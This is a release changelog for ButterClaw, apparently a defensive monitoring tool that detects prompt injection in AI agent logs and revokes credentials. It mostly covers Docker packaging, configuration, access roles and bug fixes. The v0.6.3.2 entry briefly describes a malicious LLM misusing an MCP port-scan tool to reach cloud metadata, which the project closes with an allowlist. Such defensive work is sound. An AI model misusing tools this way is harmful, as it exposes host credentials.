**No code changes in this section.** All modifications are documentation-only.

---

### Documentation Audit: ARCHITECTURE.md & API.md

#### Fixed

- **4-Tier RBAC Correction (`docs/ARCHITECTURE.md`, `docs/API.md`):** Both documents
  incorrectly described ButterClaw's access control system as 3-tier. The `infrastructure`
  role at privilege level `-1` has existed in `ROLE_HIERARCHY` since v0.6.3.1 but was
  never reflected in either doc. All references updated to "4-tier
  (Infrastructure, Admin, Operator, Viewer)" across both files.

- **Route Count Correction (`docs/API.md`):** Opening sentence stated 43 routes. Correct
  count is **49**. The API.md endpoint tables were always correct — the discrepancy was
  introduced by a note claiming GET/POST pairs on the same path should count as one route.
  In Flask they are registered as separate routes. Note removed, count corrected.

- **Operator Count Correction (`docs/ARCHITECTURE.md`):** Policy Layer caption referenced
  "16 operators." Correct count is **15**, matching the operator dispatch table in
  `policy_engine.py`.

- **Alert Channel Count Correction (`docs/ARCHITECTURE.md`):** Alert Layer referenced "5
  channels." v0.6.5 ships with **6** — `webhook`, `discord`, `telegram`, `ntfy`, `smtp`,
  `gotify`. Caption updated.

#### Changed

- **`infrastructure` Role Fully Documented (`docs/API.md`):** Dedicated row added to
  the Role Hierarchy table: privilege `-1`, rate limit 1000 req/min, bootstrapped from
  `BUTTERCLAW_API_KEY`, excluded from `GET /api/auth/keys` listings, machine-to-machine
  only.

- **`ARCHITECTURE.md` Expanded to Production Standard:** Retained existing skeleton and
  extended with:
  - **Trust Boundaries & Security Model** — Six named trust zones with trust levels and
    inter-zone communication rules. Explicitly documents the unauthenticated
    Watcher→Server path over `127.0.0.1:5000` (see D-03).
  - **System Invariants (I-01 → I-09)** — Nine code-level properties including chain step
    limit (max 10 / 60s timeout), retry queue bound (100 entries), and the
    sanitizer-is-a-targeted-blacklist rule.
  - **Data Flow Walkthroughs** — Complete step-by-step flows for Live Log → Verdict →
    Action (13 steps) and Gibson Sequence (7 steps).
  - **Design Decisions (D-01 → D-07)** — Written rationale for HMAC-not-JWT, no-eval
    policy engine, unauthenticated watcher (D-03), allow-never-short-circuits, keyring-only
    master key, targeted-blacklist sanitizer, and policies-survive-Gibson.
  - **Extension Points Table** — Six documented extension surfaces.
  - **Enhanced Component Map** — "NOT Responsible For" and "Failure Mode" columns added.

- **`API.md` Content Additions:** All 6 alert channel types and all 9 alert event types
  documented. `POST /api/analyze` request/response schemas added. Route Count Summary
  table and error response envelope format added.

- **`docs/THREAT_MODEL.md` — New File:** Formal threat model covering in-scope and
  out-of-scope threat actors, explicit system assumptions, known limitations, and
  failure modes.

#### Architecture Notes

**Documentation Drift Summary:**

| Claim | Document | Was | Is | Source of Truth |
|---|---|---|---|---|
| RBAC tier count | `ARCHITECTURE.md`, `API.md` | 3-tier | 4-tier | `ROLE_HIERARCHY` in `auth.py` |
| `infrastructure` role | `API.md` | Undocumented | privilege=-1, rate=1000/min | `auth.py` |
| Total API routes | `API.md` | 43 | 49 | Table sum in same file |
| Policy operators | `ARCHITECTURE.md` | 16 | 15 | Dispatch table in `policy_engine.py` |
| Alert channel count | `ARCHITECTURE.md` | 5 | 6 | `alert_dispatcher.py` registry |

**No code changes in this section.** All modifications are documentation-only.

---

## [0.6.5] - The Exoskeleton: The Agentic SOC - 2026-06-24

### Added
- **Zero-Day Arsenal (`default_signatures.json`):** Shipped with 5 pre-compiled regex signatures targeting CSWH and prompt injections out of the box.
- **The Paranoia Dial (`server.py`, `.env`):** Scalable kinetic response system via `BUTTERCLAW_PARANOIA`. Level 1 (Observe), Level 2 (Active Defense: SIGKILL only), Level 3 (Air-Gapped Lockdown: SIGKILL + Shred Vault).
- **Visual TUI Dashboard (`tui_dashboard.py`):** Real-time, double-buffered, flicker-free terminal interface displaying live SOC telemetry, active rules, and current Paranoia level.
- **TUI Micro-Shortcut (`install.sh`, `dash.bat`):** Deployment scripts now auto-generate a native `./dash` executable for zero-friction access to the live containerized TUI across both Linux and Windows environments.
- **Live Fire Testing Scripts (`scripts/add_rule.py`, `scripts/test_attack.py`):** Standalone diagnostic harnesses allowing operators to safely inject custom regex signatures and simulate kinetic prompt injection attacks against the Arsenal without requiring an active LLM payload.

### Security & Hardening (v0.6.4 Code Audit)
- **Infrastructure Identity (S-01):** Reconciled the ghost `infrastructure` role in `auth.py`. Bootstrapped background services now correctly align with the `ROLE_HIERARCHY`.
- **Gotify Leak Plugged (S-02):** Moved the Gotify authentication token out of the URL query parameters and into the `X-Gotify-Key` HTTP header, preventing secret leakage in Nginx access logs.
- **Gibson Race Condition (S-03):** Closed a critical timing vulnerability in `buttervault.py`. The Vault shredding sequence is now wrapped in a single SQLite `BEGIN IMMEDIATE` transaction, eliminating the window where a concurrently minted token could survive the wipe.
- **Encrypted SMTP (S-04):** SMTP passwords in the Alert Dispatcher are no longer stored in plaintext JSON. They are now fully encrypted at rest using the ButterVault keyring.
- **Thread Safety (S-05):** Secured the `routing_mode` global variable in `server.py` with a mutex lock to prevent stale or torn reads under concurrent HTTP load.
- **Brute-Force Memory (S-06):** Migrated the `_auth_failure_tracker` from volatile RAM to SQLite. Brute-force counts now survive Docker restarts and container crashes.
- **CORS & Werkzeug Hardening (S-07, S-08):** Purged `"null"` from default allowed origins and added a hard environment guard that instantly crashes the boot sequence if Flask's interactive debug mode is enabled in production.

### Changed
- **Policy Engine Arsenal Integration (`policy_engine.py`):** Arsenal signatures load into memory on boot and evaluate before SQLite deterministic rules for zero-latency threat interception.
- **Deployment Context Awareness (`install.sh`):** Added safety checks to prevent nested `git clone` loops when running the install script locally inside an active dev workspace.
- **Terminal Observability (`server.py`):** Configured the Python root logger to properly expose `INFO` level logs, ensuring Vault sealing and Arsenal payload statuses are visible across the Docker boundary.
- **Deprecation Cleansing (R-07):** Stripped all instances of the deprecated `datetime.utcnow()` across the codebase, migrating to timezone-aware UTC datetimes.
- **Thread Optimization (R-01, R-03, R-05):** Replaced unbounded thread spawning with a capped `ThreadPoolExecutor` in the Alert Dispatcher. Fixed thread stacking in the self-auditor and stripped unnecessary thread-per-request overhead in Auth.

- **Contributor Addition - Telegram Alert Channel (`alert_dispatcher.py`):** Added native Telegram Bot API support to the Alert Dispatcher. Operators can now route SOC alerts directly to mobile. Features include automatic severity-to-emoji mapping (🔴, 🟡, 🟢), safe payload chunking to respect Telegram's strict 4096-character limit, and disabled web page previews to prevent Telegram backend servers from scanning malicious URLs extracted from prompt injections. Includes strict error handling that catches silent ok: False API rejections. (Contributed by @huanghaiyss)

### ⚖️ License Migration: MIT → Apache 2.0

ButterClaw has officially transitioned from the MIT License to the **Apache License 2.0**.

This upgrade strengthens the project’s legal and contributor framework by introducing an explicit patent grant. This ensures that all contributions—including the ButterVault subsystem, the DRIFT pattern architecture, and future operator‑facing modules—are protected under a clear Defensive IP model.

Adopting Apache 2.0 aligns ButterClaw with modern enterprise security expectations and the Agentic AI Foundation (AAIF) guidelines, enabling safe, frictionless collaboration across organizations as the project grows beyond a single‑maintainer codebase.

*Note: All prior releases (v0.6.4 and below) remain MIT‑licensed. All releases from v0.6.5 onward are distributed under Apache 2.0.*

### Fixed
- **Bare-Metal Database Crashes (`policy_engine.py`):** Added self-healing directory creation to `_get_db()` to prevent SQLite `OperationalError` when running native scripts on host OS environments outside of Docker.
- **Config Self-Test (B-01):** Fixed the permanently broken version diagnostic assertion that was failing on every deployment.
- **Policy Engine Logic & Locks (B-02, B-03, R-06):** Aligned the context key for chain evaluations (`chain`), added missing database locks to `delete_policy()`, and added crucial SQLite indexes to prevent full table scans.
- **Database Descriptor Leaks (R-04):** Wrapped unmanaged SQLite connections in `buttervault.py` with `try/finally` blocks to guarantee file handle release on exception paths.
- **SSE Timeouts (R-02):** Added strict connection and read timeouts to the MCPSSEClient to prevent worker threads from hanging indefinitely on dead MCP servers.
- **TUI Database Targeting (`tui_dashboard.py`):** Patched the TUI to dynamically import `DB_PATH` from the config module, ensuring it reads from `/data/butterclaw.db` when running inside the production Docker container.

---

## [0.6.4] - ButterClaw - Exoskeleton - Autonomous Deployment - 2026-06-08

### Added
- **One-Click Install Script (`install.sh`):** Added a single file install script.

### Changed
- **Chore: bump version to v0.6.4 and unify patch fixes** Updates several files hardcoded version numbers to reflect current version.

---

## [0.6.3.2] - ButterClaw - Patched Full Docker - 2026-05-21

### Security & Kinetic Responses
- **The Double Air-Gap (`DRY_RUN`):** Plugged a critical leak where `server.py` and manual UI buttons bypassed the `DRY_RUN` safety harness. The Gibson (`buttervault.butter_keys()`) now contains a hardcoded, low-level `DRY_RUN` check. When enabled, it strictly blocks all SQLite destruction and external network revocation requests, guaranteeing safe local prompt injection testing.
- **Active Token Assassination (`buttervault.py`):** When `DRY_RUN=False`, the Gibson no longer just shreds local SQLite files. It now fires live HTTP `DELETE` and `POST` requests to GitHub and other external OAuth providers to instantly invalidate tokens globally *before* scorching the local database.
- **SSRF Lockdown (`butterclaw_mcp.py`):** Hardcoded the `scan_port` MCP tool to a strict allowlist (`127.0.0.1`, `localhost`, `host.docker.internal` on port 11434). Malicious LLMs can no longer use ButterClaw to scrape internal VPS/AWS metadata.
- **Port 5000 Isolation:** Removed raw exposed port 5000 from Docker. All UI and API traffic is now securely routed through an Nginx reverse proxy on standard web ports (80/443) using local TLS certificates. 

### Added
- **Watcher Autclation (`watcher.py`):** The Watcher daemon now gracefully serializes its in-memory retry queue to disk (`/data/retry_queue.json`) upon receiving a `SIGTERM` from Docker, ensuring no logs are lost during container reboots. It also dynamically reads the `BUTTERCLAW_API_KEY` on every request to instantly sync with rotated credentials.
- **Infrastructure Bootstrapping (`auth.py`, `server.py`):** Wired `bootstrap_infrastructure_keys()` into the server boot sequence to auto-generate baseline vault structures for background services on first boot.
- **Infrastructure Routing (`nginx/default.conf`):** Added to handle TLS termination and enforce secure, unbuffered routing for the /api/stream endpoint, fully replacing direct access to port 5000.

### Changed
- **The Config Contract:** Scrubbed hardcoded rate limits, session TTLs, and alert delivery timeouts from `auth.py` and `alert_dispatcher.py`. The `.env` file is now the absolute source of truth.
- **Dependency Diet:** Removed redundant `python-dotenv` from `requirements.txt` as `config.py` uses a standard-library parser.
- **UI Origin Policy (`index.html`,`routing.html`):** Rerouted frontend API `fetch()` calls to use relative paths (`/api/...`) and updated CSP meta tags to trust Nginx routing instead of hardcoded localhost ports.

### Fixed
- **Transport Time Bomb (`mcp_transport.py`):** Replaced unbounded recursive `.read()` loops with safe `while True` iterators, eliminating the risk of max-recursion stack crashes during prolonged 16-minute idle periods.
- **Remote Routing Crash (`config.py`):** Mapped `GOOGLE_API_KEY` into the central configuration schema to prevent `AttributeError` crashes when utilizing remote Gemini inference.
- **Database Descriptor Leaks (`policy_engine.py`):** Wrapped all SQLite interactions in safe context managers (`with _get_db() as conn:`) to prevent file descriptor exhaustion during high-volume log ingestion.

---

## [0.6.3.1] - ButterClaw - The Exoskeleton: Full Docker - 2026-05-07

### Added
- **Dark Mode System (`index.html`, `routing.html`):** Added a full class-based dark mode to the Exoskeleton dashboard. Toggled via an `html.dark` CSS override layer (219 lines) covering the full UI surface hierarchy: body (`#0f172a`) → cards/sidebar (`#1e293b`) → sub-panels and inputs (`#0f172a`) → borders (`#334155`). Butter-gold accents (`#facc15`) remain vibrant in both modes. All colored badge pastels (red, amber, emerald, blue, rose, violet, indigo, cyan) converted to `rgba()` tinted variants that preserve hue identity on dark surfaces. Form focus states emit a butter-gold glow ring. Scrollbar, shadow, table, overlay, and placeholder text all fully covered.
- **Theme Persistence (`index.html`, `routing.html`):** `localStorage` key `butterclaw-theme` stores the user's light/dark preference and applies it on page load before first paint, preventing flash-of-wrong-theme when navigating between dashboard views.
- **Infrastructure Auto-Healing (`auth.py`, `server.py`):** Added `bootstrap_infrastructure_keys()` to the server boot sequence. If the database is wiped, the server now automatically reads `BUTTERCLAW_API_KEY` from the `.env` file and permanently injects it into the new database. Solves the "Cold Start Paradox" and allows the container to achieve true idempotency.
- **Alert Dispatcher Auto-Healing (`alert_dispatcher.py`, `server.py`):** Injected `bootstrap_infrastructure_alerts()` into the main server boot sequence. The Exoskeleton now reads the `BUTTERCLAW_ALERT_NTFY_TOPIC` variable from the `.env` file on startup and automatically injects the channel configuration and critical routing rules into the database, eliminating manual UI setup.
- **Air-Gapped Push Notification Server (`docker-compose.yml`):** Integrated the official `ntfy` container into the deployment stack. Explicitly defined the `butterclaw-net` network bridge, allowing the containerized Alert Dispatcher to securely push native OS notifications to local browsers and mobile devices without transmitting telemetry to third-party cloud services.
- **Log Bridge Volume Mapping (`docker-compose.yml`):** Mapped the host machine's `./openclaw_gateway.log` directly to `/app/openclaw_gateway.log` inside the container. Allows host-based text editors (VS Code, Notepad) to pipe telemetry directly to the containerized Watcher daemon without attached shells.
- **Alternate Keyring Backend:** Added `keyrings.alt` to dependencies to provide a secure, file-based fallback for the ButterVault when running in headless Linux containers.
- **Frontend Routing Aliases (`server.py`):** Added explicit Flask decorators using `send_from_directory` so the Exoskeleton can natively serve its own dashboard in dev mode without Nginx throwing 404s.
- **Vault Boot Initialization (`server.py`):** Injected `buttervault._get_cipher()` into the main boot sequence to break a Catch-22 deadlock where secure sessions couldn't be created upon login.

### Changed
- **Sidebar Dark Mode Toggle (`index.html`, `routing.html`):** Added a pill-shaped light/dark toggle control in the sidebar above the Auth/MCP/Connection badges. Displays ☀️ Light Mode / 🌙 Dark Mode with a slider track that turns butter-gold when dark mode is active. Smooth 300ms transitions on all state changes.
- **Security Hardening (`.gitignore`, `.dockerignore`):** Explicitly isolated the container's active ./data/ directory from version control and Docker builds. This guarantees that local, live butterclaw.db files and ButterVault ciphers can never be accidentally committed to GitHub or baked into static image layers.
- **3-Tier UI Hierarchy (`index.html`, `routing.html`):** Overhauled the dashboard layout before the dark mode patch. Established a clean Hero/Standard/Compact card hierarchy, synced the navigation order, deduplicated section emojis, and unified the sidebar status badges for a cohesive SOC experience.
- **Unified Sidebar Navigation (`index.html`, `routing.html`):** Locked nav item order to a canonical sequence across both pages: Shield Status → ButterVault → Oopsie Logs → VPS Brain Routing → Event Ledger → Policy Engine → Alert Dispatcher. Added missing Alert Dispatcher nav link to `index.html`. Eliminates disorienting order mismatch when switching between dashboard views.
- **Deduplicated Navigation Icons (`index.html`, `routing.html`):** Replaced reused emoji icons that mapped to multiple unrelated sections. 🧈→🔐 (ButterVault), 📋→📝 (Oopsie Logs), 📋→📊 (Event Ledger), 🛡️→⚖️ (Policy Engine). Applied across both sidebar nav links and section card headers.
- **3-Tier Card Visual Hierarchy (`index.html`, `routing.html`):** Differentiated section cards into Hero (Shield Status, Routing Mode — `shadow-md`, `h-2` gradient bar), Standard (Endpoints, Logic Gates, MCP — `p-6`, `h-1` gradient bar), and Compact (Event Ledger, Policy Engine, Alert Dispatcher — `rounded-2xl p-5`, no gradient bar). Replaces uniform card styling that flattened visual priority.
- **Section Header Icon Sizing (`index.html`, `routing.html`):** Shrunk icon containers from `p-3 text-xl` (~48px) to `p-2 text-base` (~36px) to reduce visual weight competing with section content.
- **Unified Nav Active/Hover States (`index.html`, `routing.html`):** Removed distracting `animate-[spin_4s_linear_infinite]` CSS animation from the active VPS Brain Routing nav icon on `routing.html`. Added `group-hover:scale-110` to all non-active nav items on both pages for consistent hover feedback.
- **Sidebar Badge Style Sync (`index.html`):** Unified Auth/MCP/Connection badge labels from `text-sm font-medium` to `text-xs font-bold uppercase tracking-wide`, matching the `routing.html` treatment.
- **Sidebar Version Footer (`index.html`):** Added `ButterClaw v0.6.3.1` version badge to sidebar bottom, matching `routing.html`.
- **Version Bumps (`index.html`, `routing.html`):** All version strings updated from `v0.6.3` to `v0.6.3.1` (login modal, sidebar footer, MCP badges).
- **Watcher Auth Compliance (`watcher.py`):** Upgraded `send_to_server()` to pull the `BUTTERCLAW_API_KEY` from the OS environment (`os.environ`) and pass it as a Bearer token, fully complying with v0.6.0 Gateway Zero-Trust routing.
- **Container Environment Pipeline (`.env`):** Streamlined `.env` to act as the single source of truth for internal service accounts (`BUTTERCLAW_API_KEY`), cloud inference (`GOOGLE_API_KEY`), and Python container behavior (`PYTHONUNBUFFERED=1`).
- **Docker Network Bridge (`docker-compose.dev.yml`):** Implemented the `host.docker.internal` DNS bridge to allow the isolated container to securely reach the Windows host's native Ollama instance.
- **Environment Variable Priority (`docker-compose.yml`):** Stripped out the hardcoded `BUTTERCLAW_OLLAMA_URL` environment variable to prevent it from overriding the `.env` file via Docker's config hierarchy.

### Fixed
- **The Invisible Python Net (`.env`):** Solidified the `PYTHONUNBUFFERED=1` environment variable requirement to stop Docker from buffering `print()` statements, restoring live real-time LLM inference logs to the terminal.
- **Watcher Boot Warning Indentation (`watcher.py`):** Fixed an issue where the missing API key warning was placed outside the infinite `while True:` loop, causing it to only fire upon script termination rather than boot.
- **Split-Brain Database Bug (`buttervault.py`, `policy_engine.py`, `alert_dispatcher.py`):** Replaced hardcoded `DB_PATH` variables with a unified `try/except` block importing `cfg.DB_PATH`. Resolves an issue where different modules wrote to different SQLite files when mounted inside Docker volumes.
- **LLM Error Handling (`server.py`):** Hardened the `ask_guardian_agent()` JSON parsing block. Explicitly injects a `primary_gate: "None"` fallback if a model fails to output valid JSON, preventing `KeyError` crashes in the main event loop.
- **The 1999 HTTP Header Trap (`alert_dispatcher.py`):** Engineered a custom RFC 2047 Base64 encoding bypass for ntfy push notifications. Fixes a critical UnicodeEncodeError where Python's urllib strictly enforced Latin-1 encoding, allowing ButterClaw to seamlessly push 🦞 and 🚨 emojis in native OS alerts without crashing the dispatcher thread.
- **Template Scrubbing (`.env.example`):** Scrubbed the environment template of all legacy test credentials and internal routing topics to ensure the repository remains perfectly sterile for open-source cloning.
- **Typo Fix (`routing.html`):** Corrected `Autclated` → `Authenticated` in the routing dashboard UI.

---

## [0.6.3] - The Exoskeleton: Deployment Packaging - 2026-05-01

### Added
- **Configuration Module (`config.py`):** New standalone module (~480 lines) providing centralized, environment-driven configuration for all ButterClaw modules. Loads from environment variables (highest priority), `.env` file (if present), and hardcoded defaults (lowest priority, matching v0.6.2 behavior exactly). Includes a minimal `.env` parser built entirely on stdlib — no `python-dotenv` dependency. Zero new pip dependencies.
  - Singleton pattern: `from config import cfg` — import and use everywhere.
  - `ButterClawConfig` class with 26 configurable fields across 9 categories: Paths (`DB_PATH`, `MCP_SCRIPT`, `BASE_DIR`), Server (`HOST`, `PORT`, `DEBUG`), CORS (`CORS_ORIGINS`), Brain/Ollama (`OLLAMA_BASE_URL`, `OLLAMA_CHAT_PATH`, `MODEL_NAME`, `CONFIDENCE_THRESHOLD`, `DRY_RUN`), MCP Transport (`MCP_TRANSPORT`, `MCP_SSE_URL`, `MCP_SSE_TOKEN`), Auth (`AUTH_RATE_ADMIN`, `AUTH_RATE_OPERATOR`, `AUTH_RATE_VIEWER`, `SESSION_TTL`), Alerts (`ALERT_DELIVERY_TIMEOUT`, `ALERT_MAX_RETRIES`, `ALERT_RETRY_BACKOFF`, `AUTH_FAILURE_THRESHOLD`, `AUTH_FAILURE_WINDOW`), OAuth (`OAUTH_STATE_TTL`), Identity (`INSTANCE_ID`).
  - `BUTTERCLAW_` prefix on all env vars — namespace isolation prevents collision with system variables.
  - `_validate()` runs at import time — fail-fast on invalid config (bad port range, out-of-range confidence, invalid transport mode, malformed URL).
  - `to_dict(redact_secrets=True)` for API-safe config export — secrets like `MCP_SSE_TOKEN` are masked.
  - `to_flat_dict()` for internal diagnostics — all 26 fields, no nesting.
  - 21-step diagnostic suite (`python config.py`): singleton loading, version check, path validation, value range checks, `.env` parser format handling (plain, quoted, single-quoted, inline comments, `export` prefix, whitespace), env-over-dotenv priority enforcement, invalid config rejection (port, confidence, transport, URL), `to_dict()` structure/redaction verification, `config_source` metadata.
- **Environment Template (`.env.example`):** Documented template (~130 lines) of all 26 `BUTTERCLAW_*` variables with per-variable documentation covering Docker, systemd, and bare-metal usage patterns. Copy to `.env` and customize — never edit `.py` files for deployment config.
- **Dockerfile:** Multi-stage production container build based on `python:3.11-slim`. Non-root `butterclaw` user for security hardening. `HEALTHCHECK` directive using `scripts/healthcheck.py`. Default env vars set for Docker context (`BUTTERCLAW_DB_PATH=/data/butterclaw.db`, `BUTTERCLAW_OLLAMA_URL=http://ollama:11434`). `/data` directory created and `chown`ed for volume mount. Exposes port 5000.
- **Docker Compose (`docker-compose.yml`):** Production orchestration with 3 services:
  - `butterclaw` — Main application container. Depends on Ollama healthcheck. Mounts `butterclaw-data` volume at `/data` for SQLite persistence. JSON-file logging with 10MB rotation.
  - `ollama` — Local LLM inference engine. GPU passthrough via `nvidia-container-toolkit` (degrades gracefully to CPU if unavailable). Mounts `ollama-models` volume for model persistence. Healthcheck polls `/api/tags`.
  - `nginx` — TLS termination + reverse proxy. Serves static dashboard files (`index.html`, `routing.html`). Mounts `nginx/butterclaw.conf` and TLS certs directory.
  - Named volumes: `butterclaw-data` (SQLite persistence), `ollama-models` (model cache).
  - Named network: `butterclaw-net` (inter-container communication).
- **Docker Compose Dev Override (`docker-compose.dev.yml`):** Development mode overlay. Enables debug mode, exposes port to all interfaces, mounts entire project directory for hot-reload, disables nginx via profiles.
- **Docker Ignore (`.dockerignore`):** Build context exclusions — `.git`, `__pycache__`, `*.db`, `.env`, `backups/`, `nginx/certs/`, docs, compose files.
- **Nginx Reverse Proxy (`nginx/butterclaw.conf`):** Production-grade reverse proxy configuration:
  - HTTP → HTTPS redirect (port 80 → 443).
  - TLS termination with TLSv1.2/1.3, ECDHE cipher suites, session caching.
  - Security headers: HSTS (1 year), X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, Referrer-Policy.
  - SSE-specific proxy settings: `proxy_buffering off`, `chunked_transfer_encoding off`, 24-hour `proxy_read_timeout` for long-lived `/api/stream` connections.
  - API proxy: 300s read timeout for Brain inference on large payloads. 1MB client body limit.
  - Health endpoint: access logging disabled (prevents log spam from monitoring probes).
  - Static file serving for dashboard HTML.
- **systemd Service Unit (`systemd/butterclaw.service`):** Bare-metal VPS deployment:
  - `Restart=on-failure` with 5s delay — auto-restart on crash.
  - `EnvironmentFile=/etc/butterclaw.env` — config via standard systemd mechanism.
  - `After=ollama.service` — starts after Ollama.
  - Security hardening: `ProtectSystem=strict`, `NoNewPrivileges=true`, `PrivateTmp=true`, `ReadWritePaths` restricted to `/opt/butterclaw`.
  - Logs to journal: `journalctl -u butterclaw -f`.
- **Health Check Script (`scripts/healthcheck.py`):** Docker HEALTHCHECK endpoint. Hits `http://localhost:$BUTTERCLAW_PORT/api/health` with 5s timeout. Exit 0 = healthy, exit 1 = unhealthy. Reads port from environment.
- **Backup Script (`scripts/backup.sh`):** Cron-ready backup utility:
  - SQLite `.backup` command (atomic — never `cp` on a live DB, which risks corruption).
  - Copies `.env` configuration alongside the database.
  - Timestamped `.tar.gz` archive in `backups/` directory.
  - Auto-prunes old backups (keeps last 7).
  - Version marker file with instance ID.
- **Restore Script (`scripts/restore.sh`):** Interactive restore from backup archive:
  - Lists available backups when run without arguments.
  - Interactive confirmation prompt before overwrite.
  - Restores both database and `.env` from archive.
  - Extracts to temp directory for safety before replacing live files.
- **Formal Requirements File (`requirements.txt`):** Pinned dependency ranges formalizing the 3 existing pip dependencies: `flask>=3.0,<4.0`, `flask-cors>=4.0,<5.0`, `requests>=2.31,<3.0`. Zero new dependencies.
- **Enhanced Health Endpoint (`server.py`):** `GET /api/health` now returns `instance_id`, `uptime_seconds`, `config_source`, and per-component status (`auth`, `policy_engine`, `alert_dispatcher`, `mcp`) alongside `version`. Used by Docker HEALTHCHECK, load balancers, and monitoring.
- **Config Endpoint (`server.py`):** New `GET /api/config` (admin-only) returns the resolved configuration via `cfg.to_dict(redact_secrets=True)`. Shows config source (env vars vs `.env` vs defaults), instance identity, and all operational parameters.

### Changed
- **Unified DB_PATH (`server.py`, `auth.py`, `policy_engine.py`, `alert_dispatcher.py`, `buttervault.py`):** All 5 modules now import `DB_PATH` from `config.cfg` via `try/except ImportError` guard. `BASE_DIR` preserved as a standalone variable for backward compatibility — `alert_dispatcher.py` uses it in diagnostic mode, `buttervault.py` uses it for keyring paths. Eliminates 5 independent `DB_PATH` computations — single source of truth via `config.py`.
  ```python
  BASE_DIR = os.path.dirname(os.path.abspath(__file__))
  try:
      from config import cfg
      DB_PATH = cfg.DB_PATH
  except ImportError:
      DB_PATH = os.path.join(BASE_DIR, 'butterclaw.db')
  ```
- **Externalized Hardcoded Values (`server.py`):** 14 previously hardcoded values now read from `config.cfg`:
  - `DRY_RUN` ← `cfg.DRY_RUN`
  - `CONFIDENCE_THRESHOLD` ← `cfg.CONFIDENCE_THRESHOLD`
  - `ALLOWED_ORIGINS` ← `cfg.CORS_ORIGINS`
  - `OLLAMA_LOCAL_BASE` ← `cfg.OLLAMA_BASE_URL`
  - `OLLAMA_CHAT_PATH` ← `cfg.OLLAMA_CHAT_PATH`
  - `model_name` ← `cfg.MODEL_NAME`
  - `mcp_transport_mode` ← `cfg.MCP_TRANSPORT`
  - `mcp_sse_url` ← `cfg.MCP_SSE_URL`
  - `mcp_sse_token` ← `cfg.MCP_SSE_TOKEN`
  - `OAUTH_STATE_TTL` ← `cfg.OAUTH_STATE_TTL`
  - MCP script path ← `cfg.MCP_SCRIPT`
  - `app.run()` host/port/debug ← `cfg.HOST` / `cfg.PORT` / `cfg.DEBUG`
- **Boot Banner (`server.py`):** Now shows config source (env/dotenv/defaults), instance ID, database path, and all module statuses (Auth, Policy Engine, Alert Dispatcher, Config).
- **Version Bumps:** `VERSION = "0.6.3"` in `server.py`. 6 version string updates in `routing.html` (sidebar footer, MCP Armed/Degraded/Offline badges, MCP Info Box, auth login modal footer). 1 version string update in `index.html` (auth login modal footer).
- **Project Structure:** Infrastructure files organized into subdirectories:
  - `scripts/` — `healthcheck.py`, `backup.sh`, `restore.sh`
  - `nginx/` — `butterclaw.conf`
  - `systemd/` — `butterclaw.service`

### Architecture Notes

**Configuration Priority Chain:**
```
┌─────────────────────────────────────────┐
│  1. Environment Variables (highest)     │
│     Set by Docker, systemd, or shell    │
│     BUTTERCLAW_PORT=8080                │
├─────────────────────────────────────────┤
│  2. .env File                           │
│     Project root, loaded by config.py   │
│     Only sets vars NOT already in env   │
├─────────────────────────────────────────┤
│  3. Hardcoded Defaults (lowest)         │
│     In ButterClawConfig.__init__()      │
│     Match v0.6.2 behavior exactly       │
└─────────────────────────────────────────┘
```

**DB_PATH Unification:**
```
BEFORE (v0.6.2):                    AFTER (v0.6.3):
┌── server.py ──────────────┐      ┌── config.py ──────────────┐
│ BASE_DIR = dirname(...)   │      │ cfg.DB_PATH = env or      │
│ DB_PATH = join(BASE_DIR)  │      │   .env or default         │
├── auth.py ────────────────┤      └───────────┬───────────────┘
│ BASE_DIR = dirname(...)   │                  │
│ DB_PATH = join(BASE_DIR)  │      ┌───────────▼───────────────┐
├── policy_engine.py ───────┤      │ All 5 modules:            │
│ BASE_DIR = dirname(...)   │      │   from config import cfg  │
│ DB_PATH = join(BASE_DIR)  │      │   DB_PATH = cfg.DB_PATH   │
├── alert_dispatcher.py ────┤      │                           │
│ BASE_DIR = dirname(...)   │      │ Fallback (no config.py):  │
│ DB_PATH = join(BASE_DIR)  │      │   DB_PATH = join(BASE_DIR,│
├── buttervault.py ─────────┤      │     'butterclaw.db')      │
│ BASE_DIR = dirname(...)   │      └───────────────────────────┘
│ DB_PATH = join(BASE_DIR)  │
└───────────────────────────┘
  5 independent computations         1 source of truth
```

**Docker Deployment Architecture:**
```
┌─────────────────────────────────────────┐
│  Host Machine                           │
│                                         │
│  ┌──── nginx (TLS termination) ──────┐  │
│  │  :443 → butterclaw:5000           │  │
│  │  :80 → redirect to :443           │  │
│  │  /api/stream → SSE proxy (24h)    │  │
│  │  Security headers (HSTS, CSP)     │  │
│  └───────────────────────────────────┘  │
│                                         │
│  ┌──── butterclaw (app) ──────────── ─┐ │
│  │  config.py ← .env                  │ │
│  │  server.py + auth + policy + alert │ │
│  │  Volume: /data/butterclaw.db       │ │
│  │  HEALTHCHECK: healthcheck.py       │ │
│  │  User: butterclaw (non-root)       │ │
│  └────────────────────────────────────┘ │
│                                         │
│  ┌──── ollama (inference) ────────────┐ │
│  │  GPU passthrough (if available)    │ │
│  │  Volume: ollama-models             │ │
│  │  HEALTHCHECK: /api/tags            │ │
│  └────────────────────────────────────┘ │
│                                         │
│  Volumes:                               │
│  ├── butterclaw-data (SQLite)           │
│  └── ollama-models (model cache)        │
│                                         │
│  Network: butterclaw-net                │
└─────────────────────────────────────────┘
```

**What Survives Gibson (updated for v0.6.3):**
```
DESTROYED by Gibson:           SURVIVES Gibson:
├── vault table (API keys)     ├── policies table
├── oauth_tokens table         ├── policy_events table
├── api_keys table             ├── alert_channels table
├── session cache              ├── alert_rules table
└── OS keyring master key      ├── alert_history table
                               ├── mcp_events table
                               ├── logs table
                               └── config.py / .env (filesystem)
```

**What Survives Container Restart:**

| Data | Storage | Persists? |
|------|---------|-----------|
| SQLite DB (all tables) | butterclaw-data volume | Yes |
| Ollama models | ollama-models volume | Yes |
| TLS certs | ./nginx/certs/ bind mount | Yes |
| .env config | env_file directive | Yes |
| API keys (in DB) | butterclaw-data volume | Yes |
| Policies (in DB) | butterclaw-data volume | Yes |
| Alert channels/rules (in DB) | butterclaw-data volume | Yes |
| In-memory session cache | Container memory | No (re-auth required) |
| Auth failure tracker | Container memory | No (resets) |
| MCP process state | Container memory | No (re-handshake) |

**Deployment Options:**

| Feature | Docker Compose | systemd (Bare-Metal) | Manual (python server.py) |
|---------|---------------|---------------------|---------------------------|
| TLS termination | nginx container | Bring your own | None |
| Auto-restart | restart: unless-stopped | Restart=on-failure | None |
| GPU passthrough | nvidia-container-toolkit | Native | Native |
| Log rotation | JSON-file driver | journald | None |
| Backup/restore | scripts/backup.sh | scripts/backup.sh | scripts/backup.sh |
| Health monitoring | HEALTHCHECK directive | Manual probes | None |
